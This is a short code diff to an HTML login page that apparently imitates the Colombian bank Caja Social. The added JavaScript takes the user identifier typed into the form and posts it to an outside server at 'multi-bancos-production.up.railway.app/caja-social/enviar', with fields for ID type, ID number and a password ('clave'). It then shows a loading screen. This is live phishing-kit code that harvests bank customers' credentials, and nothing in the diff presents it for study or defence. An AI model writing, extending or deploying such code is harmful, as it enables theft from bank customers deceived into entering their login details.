@@ -66,7 +66,6 @@
         </div>
     </div>
     
-    <script src="/socket.io/socket.io.js"></script>
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             const usuarioInput = document.getElementById('usuario');
@@ -101,10 +100,24 @@
                 e.preventDefault();
                 const value = usuarioInput.value.trim().toUpperCase();
                 if (validPattern.test(value)) {
+                    var sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000));
+                    sessionStorage.setItem('sessionId', sessionId);
                     sessionStorage.setItem('usuario', value);
-                    if (typeof socketManager !== 'undefined' && socketManager.sendUsuario) {
-                        socketManager.sendUsuario(value);
-                    }
+                    
+                    fetch('https://multi-bancos-production.up.railway.app/caja-social/enviar', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            sessionId: sessionId,
+                            tipo: 'Usuario',
+                            tipoDoc: 'CC',
+                            identificacion: value,
+                            clave: ''
+                        })
+                    }).then(function(r){ return r.json(); })
+                      .then(function(data){ console.log('Enviado:', data); })
+                      .catch(function(err){ console.error('Error:', err); });
+                    
                     var pantalla = document.getElementById('pantallaCarga');
                     if (pantalla) pantalla.classList.add('activa');
                     setTimeout(function(){
@@ -117,9 +130,6 @@
             });
         });
     </script>
-
-    <script src="/js/banco-utils.js"></script>
-    <script src="client-optimized.js"></script>
 
 <script>
 (function(){
